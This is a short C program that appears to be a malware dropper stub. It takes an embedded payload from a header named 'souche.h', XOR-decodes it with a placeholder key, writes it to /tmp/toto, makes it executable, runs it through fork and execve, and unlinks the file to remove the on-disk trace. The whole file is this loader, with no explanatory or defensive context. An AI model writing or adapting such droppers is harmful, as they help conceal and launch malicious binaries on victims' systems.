#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#include "souche.h"

#define EXEC_PATH "/tmp/toto"

void main(){
    unsigned char *plain = malloc(data_len);

    for(int i=0; i< data_len; i++){
        plain[i] = data[i] ^ 0;
    }

    FILE *fp = fopen(EXEC_PATH, "w+");
    fwrite(plain, data_len, 1, fp);
    fclose(fp);
    free(plain);

    chmod(EXEC_PATH, S_IXOTH | S_IXUSR | S_IXGRP);
    if(fork()){
        execve(EXEC_PATH, NULL, NULL);
    }else{
        unlink(EXEC_PATH);
    }
}